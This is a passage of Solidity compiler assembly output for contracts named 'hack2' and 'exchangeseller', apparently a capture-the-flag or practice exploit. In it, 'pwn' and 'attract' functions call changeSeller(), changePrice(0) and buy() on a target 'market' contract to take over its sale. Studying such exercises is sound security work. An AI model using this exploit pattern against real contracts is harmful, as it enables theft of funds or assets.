\"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2792  mar */\n              dup2\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2804  mar.changePrice */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xa2b40d19\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2805:2806  0 */\n              0x00\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2789:2807  mar.changePrice(0) */\n              mload(0x40)\n              dup3\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              tag_14\n              swap2\n              swap1\n              tag_15\n              jump\t// in\n            tag_14:\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_16\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_16:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_18\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_18:\n              pop\n              pop\n              pop\n              pop\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2701:2846  function pwn(market mar) public returns(uint128){... */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":88:205   */\n            tag_20:\n                /* \"#utility.yul\":197:198   */\n              0x00\n                /* \"#utility.yul\":194:195   */\n              dup1\n                /* \"#utility.yul\":187:199   */\n              revert\n                /* \"#utility.yul\":334:460   */\n            tag_22:\n                /* \"#utility.yul\":371:378   */\n              0x00\n                /* \"#utility.yul\":411:453   */\n              0xffffffffffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":404:409   */\n              dup3\n                /* \"#utility.yul\":400:454   */\n              and\n                /* \"#utility.yul\":389:454   */\n              swap1\n              pop\n                /* \"#utility.yul\":334:460   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":466:562   */\n            tag_23:\n                /* \"#utility.yul\":503:510   */\n              0x00\n                /* \"#utility.yul\":532:556   */\n              tag_40\n                /* \"#utility.yul\":550:555   */\n              dup3\n                /* \"#utility.yul\":532:556   */\n              tag_22\n              jump\t// in\n            tag_40:\n                /* \"#utility.yul\":521:556   */\n              swap1\n              pop\n                /* \"#utility.yul\":466:562   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":568:678   */\n            tag_24:\n                /* \"#utility.yul\":619:626   */\n              0x00\n                /* \"#utility.yul\":648:672   */\n              tag_42\n                /* \"#utility.yul\":666:671   */\n              dup3\n                /* \"#utility.yul\":648:672   */\n              tag_23\n              jump\t// in\n            tag_42:\n                /* \"#utility.yul\":637:672   */\n              swap1\n              pop\n                /* \"#utility.yul\":568:678   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":684:834   */\n            tag_25:\n                /* \"#utility.yul\":771:809   */\n              tag_44\n                /* \"#utility.yul\":803:808   */\n              dup2\n                /* \"#utility.yul\":771:809   */\n              tag_24\n              jump\t// in\n            tag_44:\n                /* \"#utility.yul\":764:769   */\n              dup2\n                /* \"#utility.yul\":761:810   */\n              eq\n                /* \"#utility.yul\":751:828   */\n              tag_45\n              jumpi\n                /* \"#utility.yul\":824:825   */\n              0x00\n                /* \"#utility.yul\":821:822   */\n              dup1\n                /* \"#utility.yul\":814:826   */\n              revert\n                /* \"#utility.yul\":751:828   */\n            tag_45:\n                /* \"#utility.yul\":684:834   */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":840:1007   */\n            tag_26:\n                /* \"#utility.yul\":900:905   */\n              0x00\n                /* \"#utility.yul\":938:944   */\n              dup2\n                /* \"#utility.yul\":925:945   */\n              calldataload\n                /* \"#utility.yul\":916:945   */\n              swap1\n              pop\n                /* \"#utility.yul\":954:1001   */\n              tag_47\n                /* \"#utility.yul\":995:1000   */\n              dup2\n                /* \"#utility.yul\":954:1001   */\n              tag_25\n              jump\t// in\n            tag_47:\n                /* \"#utility.yul\":840:1007   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1013:1370   */\n            tag_6:\n                /* \"#utility.yul\":1086:1092   */\n              0x00\n                /* \"#utility.yul\":1135:1137   */\n              0x20\n                /* \"#utility.yul\":1123:1132   */\n              dup3\n                /* \"#utility.yul\":1114:1121   */\n              dup5\n                /* \"#utility.yul\":1110:1133   */\n              sub\n                /* \"#utility.yul\":1106:1138   */\n              slt\n                /* \"#utility.yul\":1103:1222   */\n              iszero\n              tag_49\n              jumpi\n                /* \"#utility.yul\":1141:1220   */\n              tag_50\n              tag_20\n              jump\t// in\n            tag_50:\n                /* \"#utility.yul\":1103:1222   */\n            tag_49:\n                /* \"#utility.yul\":1261:1262   */\n              0x00\n                /* \"#utility.yul\":1286:1353   */\n              tag_51\n                /* \"#utility.yul\":1345:1352   */\n              dup5\n                /* \"#utility.yul\":1336:1342   */\n              dup3\n                /* \"#utility.yul\":1325:1334   */\n              dup6\n                /* \"#utility.yul\":1321:1343   */\n              add\n                /* \"#utility.yul\":1286:1353   */\n              tag_26\n              jump\t// in\n            tag_51:\n                /* \"#utility.yul\":1276:1353   */\n              swap2\n              pop\n                /* \"#utility.yul\":1232:1363   */\n              pop\n                /* \"#utility.yul\":1013:1370   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1376:1494   */\n            tag_27:\n                /* \"#utility.yul\":1413:1420   */\n              0x00\n                /* \"#utility.yul\":1453:1487   */\n              0xffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":1446:1451   */\n              dup3\n                /* \"#utility.yul\":1442:1488   */\n              and\n                /* \"#utility.yul\":1431:1488   */\n              swap1\n              pop\n                /* \"#utility.yul\":1376:1494   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1500:1618   */\n            tag_28:\n                /* \"#utility.yul\":1587:1611   */\n              tag_54\n                /* \"#utility.yul\":1605:1610   */\n              dup2\n                /* \"#utility.yul\":1587:1611   */\n              tag_27\n              jump\t// in\n            tag_54:\n                /* \"#utility.yul\":1582:1585   */\n              dup3\n                /* \"#utility.yul\":1575:1612   */\n              mstore\n                /* \"#utility.yul\":1500:1618   */\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1624:1846   */\n            tag_9:\n                /* \"#utility.yul\":1717:1721   */\n              0x00\n                /* \"#utility.yul\":1755:1757   */\n              0x20\n                /* \"#utility.yul\":1744:1753   */\n              dup3\n                /* \"#utility.yul\":1740:1758   */\n              add\n                /* \"#utility.yul\":1732:1758   */\n              swap1\n              pop\n                /* \"#utility.yul\":1768:1839   */\n              tag_56\n                /* \"#utility.yul\":1836:1837   */\n              0x00\n                /* \"#utility.yul\":1825:1834   */\n              dup4\n                /* \"#utility.yul\":1821:1838   */\n              add\n                /* \"#utility.yul\":1812:1818   */\n              dup5\n                /* \"#utility.yul\":1768:1839   */\n              tag_28\n              jump\t// in\n            tag_56:\n                /* \"#utility.yul\":1624:1846   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1852:1937   */\n            tag_29:\n                /* \"#utility.yul\":1897:1904   */\n              0x00\n                /* \"#utility.yul\":1926:1931   */\n              dup2\n                /* \"#utility.yul\":1915:1931   */\n              swap1\n              pop\n                /* \"#utility.yul\":1852:1937   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1943:2020   */\n            tag_30:\n                /* \"#utility.yul\":1980:1987   */\n              0x00\n                /* \"#utility.yul\":2009:2014   */\n              dup2\n                /* \"#utility.yul\":1998:2014   */\n              swap1\n              pop\n                /* \"#utility.yul\":1943:2020   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":2026:2086   */\n            tag_31:\n                /* \"#utility.yul\":2054:2057   */\n              0x00\n                /* \"#utility.yul\":2075:2080   */\n              dup2\n                /* \"#utility.yul\":2068:2080   */\n              swap1\n              pop\n                /* \"#utility.yul\":2026:2086   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":2092:2250   */\n            tag_32:\n                /* \"#utility.yul\":2150:2159   */\n              0x00\n                /* \"#utility.yul\":2183:2244   */\n              tag_61\n                /* \"#utility.yul\":2201:2243   */\n              tag_62\n                /* \"#utility.yul\":2210:2242   */\n              tag_63\n                /* \"#utility.yul\":2236:2241   */\n              dup5\n                /* \"#utility.yul\":2210:2242   */\n              tag_29\n              jump\t// in\n            tag_63:\n                /* \"#utility.yul\":2201:2243   */\n              tag_31\n              jump\t// in\n            tag_62:\n                /* \"#utility.yul\":2183:2244   */\n              tag_30\n              jump\t// in\n            tag_61:\n                /* \"#utility.yul\":2170:2244   */\n              swap1\n              pop\n                /* \"#utility.yul\":2092:2250   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":2256:2403   */\n            tag_33:\n                /* \"#utility.yul\":2351:2396   */\n              tag_65\n                /* \"#utility.yul\":2390:2395   */\n              dup2\n                /* \"#utility.yul\":2351:2396   */\n              tag_32\n              jump\t// in\n            tag_65:\n                /* \"#utility.yul\":2346:2349   */\n              dup3\n                /* \"#utility.yul\":2339:2397   */\n              mstore\n                /* \"#utility.yul\":2256:2403   */\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":2409:2647   */\n            tag_15:\n                /* \"#utility.yul\":2510:2514   */\n              0x00\n                /* \"#utility.yul\":2548:2550   */\n              0x20\n                /* \"#utility.yul\":2537:2546   */\n              dup3\n                /* \"#utility.yul\":2533:2551   */\n              add\n                /* \"#utility.yul\":2525:2551   */\n              swap1\n              pop\n                /* \"#utility.yul\":2561:2640   */\n              tag_67\n                /* \"#utility.yul\":2637:2638   */\n              0x00\n                /* \"#utility.yul\":2626:2635   */\n              dup4\n                /* \"#utility.yul\":2622:2639   */\n              add\n                /* \"#utility.yul\":2613:2619   */\n              dup5\n                /* \"#utility.yul\":2561:2640   */\n              tag_33\n              jump\t// in\n            tag_67:\n                /* \"#utility.yul\":2409:2647   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n\n            auxdata: 0xa2646970667358221220a54c85344f49e2aba4a89ce553c24d4ef0380e584eef5bf8216541c14fd339c964736f6c63430008150033\n        }\n    }\n\n    sub_1: assembly {\n            /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2853:2982  contract hack2 {... */\n          mstore(0x40, 0x80)\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2853:2982  contract hack2 {... */\n              mstore(0x40, 0x80)\n              callvalue\n              dup1\n              iszero\n              tag_1\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_1:\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x02c6591d\n              eq\n              tag_3\n              jumpi\n            tag_2:\n              0x00\n              dup1\n              revert\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2875:2979  function pwn(market mar) public returns(uint128){... */\n            tag_3:\n              tag_4\n              0x04\n              dup1\n              calldatasize\n              sub\n              dup2\n              add\n              swap1\n              tag_5\n              swap2\n              swap1\n              tag_6\n              jump\t// in\n            tag_5:\n              tag_7\n              jump\t// in\n            tag_4:\n              mload(0x40)\n              tag_8\n              swap2\n              swap1\n              tag_9\n              jump\t// in\n            tag_8:\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n            tag_7:\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2915:2922  uint128 */\n              0x00\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2934:2937  mar */\n              dup2\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2934:2941  mar.buy */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xa6f2ae3a\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2934:2943  mar.buy() */\n              mload(0x40)\n              dup2\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_11\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_11:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_13\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_13:\n              pop\n              pop\n              pop\n              pop\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2954:2957  mar */\n              dup2\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2954:2969  mar.isCompleted */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xfa391c64\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2954:2971  mar.isCompleted() */\n              mload(0x40)\n              dup2\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_14\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_14:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_16\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_16:\n              pop\n              pop\n              pop\n              pop\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2875:2979  function pwn(market mar) public returns(uint128){... */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":88:205   */\n            tag_18:\n                /* \"#utility.yul\":197:198   */\n              0x00\n                /* \"#utility.yul\":194:195   */\n              dup1\n                /* \"#utility.yul\":187:199   */\n              revert\n                /* \"#utility.yul\":334:460   */\n            tag_20:\n                /* \"#utility.yul\":371:378   */\n              0x00\n                /* \"#utility.yul\":411:453   */\n              0xffffffffffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":404:409   */\n              dup3\n                /* \"#utility.yul\":400:454   */\n              and\n                /* \"#utility.yul\":389:454   */\n              swap1\n              pop\n                /* \"#utility.yul\":334:460   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":466:562   */\n            tag_21:\n                /* \"#utility.yul\":503:510   */\n              0x00\n                /* \"#utility.yul\":532:556   */\n              tag_33\n                /* \"#utility.yul\":550:555   */\n              dup3\n                /* \"#utility.yul\":532:556   */\n              tag_20\n              jump\t// in\n            tag_33:\n                /* \"#utility.yul\":521:556   */\n              swap1\n              pop\n                /* \"#utility.yul\":466:562   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":568:678   */\n            tag_22:\n                /* \"#utility.yul\":619:626   */\n              0x00\n                /* \"#utility.yul\":648:672   */\n              tag_35\n                /* \"#utility.yul\":666:671   */\n              dup3\n                /* \"#utility.yul\":648:672   */\n              tag_21\n              jump\t// in\n            tag_35:\n                /* \"#utility.yul\":637:672   */\n              swap1\n              pop\n                /* \"#utility.yul\":568:678   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":684:834   */\n            tag_23:\n                /* \"#utility.yul\":771:809   */\n              tag_37\n                /* \"#utility.yul\":803:808   */\n              dup2\n                /* \"#utility.yul\":771:809   */\n              tag_22\n              jump\t// in\n            tag_37:\n                /* \"#utility.yul\":764:769   */\n              dup2\n                /* \"#utility.yul\":761:810   */\n              eq\n                /* \"#utility.yul\":751:828   */\n              tag_38\n              jumpi\n                /* \"#utility.yul\":824:825   */\n              0x00\n                /* \"#utility.yul\":821:822   */\n              dup1\n                /* \"#utility.yul\":814:826   */\n              revert\n                /* \"#utility.yul\":751:828   */\n            tag_38:\n                /* \"#utility.yul\":684:834   */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":840:1007   */\n            tag_24:\n                /* \"#utility.yul\":900:905   */\n              0x00\n                /* \"#utility.yul\":938:944   */\n              dup2\n                /* \"#utility.yul\":925:945   */\n              calldataload\n                /* \"#utility.yul\":916:945   */\n              swap1\n              pop\n                /* \"#utility.yul\":954:1001   */\n              tag_40\n                /* \"#utility.yul\":995:1000   */\n              dup2\n                /* \"#utility.yul\":954:1001   */\n              tag_23\n              jump\t// in\n            tag_40:\n                /* \"#utility.yul\":840:1007   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1013:1370   */\n            tag_6:\n                /* \"#utility.yul\":1086:1092   */\n              0x00\n                /* \"#utility.yul\":1135:1137   */\n              0x20\n                /* \"#utility.yul\":1123:1132   */\n              dup3\n                /* \"#utility.yul\":1114:1121   */\n              dup5\n                /* \"#utility.yul\":1110:1133   */\n              sub\n                /* \"#utility.yul\":1106:1138   */\n              slt\n                /* \"#utility.yul\":1103:1222   */\n              iszero\n              tag_42\n              jumpi\n                /* \"#utility.yul\":1141:1220   */\n              tag_43\n              tag_18\n              jump\t// in\n            tag_43:\n                /* \"#utility.yul\":1103:1222   */\n            tag_42:\n                /* \"#utility.yul\":1261:1262   */\n              0x00\n                /* \"#utility.yul\":1286:1353   */\n              tag_44\n                /* \"#utility.yul\":1345:1352   */\n              dup5\n                /* \"#utility.yul\":1336:1342   */\n              dup3\n                /* \"#utility.yul\":1325:1334   */\n              dup6\n                /* \"#utility.yul\":1321:1343   */\n              add\n                /* \"#utility.yul\":1286:1353   */\n              tag_24\n              jump\t// in\n            tag_44:\n                /* \"#utility.yul\":1276:1353   */\n              swap2\n              pop\n                /* \"#utility.yul\":1232:1363   */\n              pop\n                /* \"#utility.yul\":1013:1370   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1376:1494   */\n            tag_25:\n                /* \"#utility.yul\":1413:1420   */\n              0x00\n                /* \"#utility.yul\":1453:1487   */\n              0xffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":1446:1451   */\n              dup3\n                /* \"#utility.yul\":1442:1488   */\n              and\n                /* \"#utility.yul\":1431:1488   */\n              swap1\n              pop\n                /* \"#utility.yul\":1376:1494   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1500:1618   */\n            tag_26:\n                /* \"#utility.yul\":1587:1611   */\n              tag_47\n                /* \"#utility.yul\":1605:1610   */\n              dup2\n                /* \"#utility.yul\":1587:1611   */\n              tag_25\n              jump\t// in\n            tag_47:\n                /* \"#utility.yul\":1582:1585   */\n              dup3\n                /* \"#utility.yul\":1575:1612   */\n              mstore\n                /* \"#utility.yul\":1500:1618   */\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1624:1846   */\n            tag_9:\n                /* \"#utility.yul\":1717:1721   */\n              0x00\n                /* \"#utility.yul\":1755:1757   */\n              0x20\n                /* \"#utility.yul\":1744:1753   */\n              dup3\n                /* \"#utility.yul\":1740:1758   */\n              add\n                /* \"#utility.yul\":1732:1758   */\n              swap1\n              pop\n                /* \"#utility.yul\":1768:1839   */\n              tag_49\n                /* \"#utility.yul\":1836:1837   */\n              0x00\n                /* \"#utility.yul\":1825:1834   */\n              dup4\n                /* \"#utility.yul\":1821:1838   */\n              add\n                /* \"#utility.yul\":1812:1818   */\n              dup5\n                /* \"#utility.yul\":1768:1839   */\n              tag_26\n              jump\t// in\n            tag_49:\n                /* \"#utility.yul\":1624:1846   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n\n            auxdata: 0xa2646970667358221220dfe35e8586a090cd3d50ab2d85a49260f8b34f87efb4ca77faa4d51b2160414664736f6c63430008150033\n        }\n    }\n\n    sub_2: assembly {\n            /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1249:1406  contract exchangeseller{... */\n          mstore(0x40, 0x80)\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1249:1406  contract exchangeseller{... */\n              mstore(0x40, 0x80)\n              callvalue\n              dup1\n              iszero\n              tag_1\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_1:\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0xdbf16873\n              eq\n              tag_3\n              jumpi\n            tag_2:\n              0x00\n              dup1\n              revert\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1281:1403  function attract(address addr) public {... */\n            tag_3:\n              tag_4\n              0x04\n              dup1\n              calldatasize\n              sub\n              dup2\n              add\n              swap1\n              tag_5\n              swap2\n              swap1\n              tag_6\n              jump\t// in\n            tag_5:\n              tag_7\n              jump\t// in\n            tag_4:\n              stop\n            tag_7:\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1337:1341  addr */\n              dup1\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1330:1355  market(addr).changeSeller */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xe90e2fed\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1330:1357  market(addr).changeSeller() */\n              mload(0x40)\n              dup2\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_9\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_9:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_11\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_11:\n              pop\n              pop\n              pop\n              pop\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1375:1379  addr */\n              dup1\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1368:1392  market(addr).changePrice */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xa2b40d19\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1393:1394  0 */\n              0x00\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1368:1395  market(addr).changePrice(0) */\n              mload(0x40)\n              dup3\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              tag_12\n              swap2\n              swap1\n              tag_13\n              jump\t// in\n            tag_12:\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_14\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_14:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_16\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_16:\n              pop\n              pop\n              pop\n              pop\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":1281:1403  function attract(address addr) public {... */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":88:205   */\n            tag_18:\n                /* \"#utility.yul\":197:198   */\n              0x00\n                /* \"#utility.yul\":194:195   */\n              dup1\n                /* \"#utility.yul\":187:199   */\n              revert\n                /* \"#utility.yul\":334:460   */\n            tag_20:\n                /* \"#utility.yul\":371:378   */\n              0x00\n                /* \"#utility.yul\":411:453   */\n              0xffffffffffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":404:409   */\n              dup3\n                /* \"#utility.yul\":400:454   */\n              and\n                /* \"#utility.yul\":389:454   */\n              swap1\n              pop\n                /* \"#utility.yul\":334:460   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":466:562   */\n            tag_21:\n                /* \"#utility.yul\":503:510   */\n              0x00\n                /* \"#utility.yul\":532:556   */\n              tag_35\n                /* \"#utility.yul\":550:555   */\n              dup3\n                /* \"#utility.yul\":532:556   */\n              tag_20\n              jump\t// in\n            tag_35:\n                /* \"#utility.yul\":521:556   */\n              swap1\n              pop\n                /* \"#utility.yul\":466:562   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":568:690   */\n            tag_22:\n                /* \"#utility.yul\":641:665   */\n              tag_37\n                /* \"#utility.yul\":659:664   */\n              dup2\n                /* \"#utility.yul\":641:665   */\n              tag_21\n              jump\t// in\n            tag_37:\n                /* \"#utility.yul\":634:639   */\n              dup2\n                /* \"#utility.yul\":631:666   */\n              eq\n                /* \"#utility.yul\":621:684   */\n              tag_38\n              jumpi\n                /* \"#utility.yul\":680:681   */\n              0x00\n                /* \"#utility.yul\":677:678   */\n              dup1\n                /* \"#utility.yul\":670:682   */\n              revert\n                /* \"#utility.yul\":621:684   */\n            tag_38:\n                /* \"#utility.yul\":568:690   */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":696:835   */\n            tag_23:\n                /* \"#utility.yul\":742:747   */\n              0x00\n                /* \"#utility.yul\":780:786   */\n              dup2\n                /* \"#utility.yul\":767:787   */\n              calldataload\n                /* \"#utility.yul\":758:787   */\n              swap1\n              pop\n                /* \"#utility.yul\":796:829   */\n              tag_40\n                /* \"#utility.yul\":823:828   */\n              dup2\n                /* \"#utility.yul\":796:829   */\n              tag_22\n              jump\t// in\n            tag_40:\n                /* \"#utility.yul\":696:835   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":841:1170   */\n            tag_6:\n                /* \"#utility.yul\":900:906   */\n              0x00\n                /* \"#utility.yul\":949:951   */\n              0x20\n                /* \"#utility.yul\":937:946   */\n              dup3\n                /* \"#utility.yul\":928:935   */\n              dup5\n                /* \"#utility.yul\":924:947   */\n              sub\n                /* \"#utility.yul\":920:952   */\n              slt\n                /* \"#utility.yul\":917:1036   */\n              iszero\n              tag_42\n              jumpi\n                /* \"#utility.yul\":955:1034   */\n              tag_43\n              tag_18\n              jump\t// in\n            tag_43:\n                /* \"#utility.yul\":917:1036   */\n            tag_42:\n                /* \"#utility.yul\":1075:1076   */\n              0x00\n                /* \"#utility.yul\":1100:1153   */\n              tag_44\n                /* \"#utility.yul\":1145:1152   */\n              dup5\n                /* \"#utility.yul\":1136:1142   */\n              dup3\n                /* \"#utility.yul\":1125:1134   */\n              dup6\n                /* \"#utility.yul\":1121:1143   */\n              add\n                /* \"#utility.yul\":1100:1153   */\n              tag_23\n              jump\t// in\n            tag_44:\n                /* \"#utility.yul\":1090:1153   */\n              swap2\n              pop\n                /* \"#utility.yul\":1046:1163   */\n              pop\n                /* \"#utility.yul\":841:1170   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1176:1261   */\n            tag_24:\n                /* \"#utility.yul\":1221:1228   */\n              0x00\n                /* \"#utility.yul\":1250:1255   */\n              dup2\n                /* \"#utility.yul\":1239:1255   */\n              swap1\n              pop\n                /* \"#utility.yul\":1176:1261   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1267:1344   */\n            tag_25:\n                /* \"#utility.yul\":1304:1311   */\n              0x00\n                /* \"#utility.yul\":1333:1338   */\n              dup2\n                /* \"#utility.yul\":1322:1338   */\n              swap1\n              pop\n                /* \"#utility.yul\":1267:1344   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1350:1410   */\n            tag_26:\n                /* \"#utility.yul\":1378:1381   */\n              0x00\n                /* \"#utility.yul\":1399:1404   */\n              dup2\n                /* \"#utility.yul\":1392:1404   */\n              swap1\n              pop\n                /* \"#utility.yul\":1350:1410   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1416:1574   */\n            tag_27:\n                /* \"#utility.yul\":1474:1483   */\n              0x00\n                /* \"#utility.yul\":1507:1568   */\n              tag_49\n                /* \"#utility.yul\":1525:1567   */\n              tag_50\n                /* \"#utility.yul\":1534:1566   */\n              tag_51\n                /* \"#utility.yul\":1560:1565   */\n              dup5\n                /* \"#utility.yul\":1534:1566   */\n              tag_24\n              jump\t// in\n            tag_51:\n                /* \"#utility.yul\":1525:1567   */\n              tag_26\n              jump\t// in\n            tag_50:\n                /* \"#utility.yul\":1507:1568   */\n              tag_25\n              jump\t// in\n            tag_49:\n                /* \"#utility.yul\":1494:1568   */\n              swap1\n              pop\n                /* \"#utility.yul\":1416:1574   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1580:1727   */\n            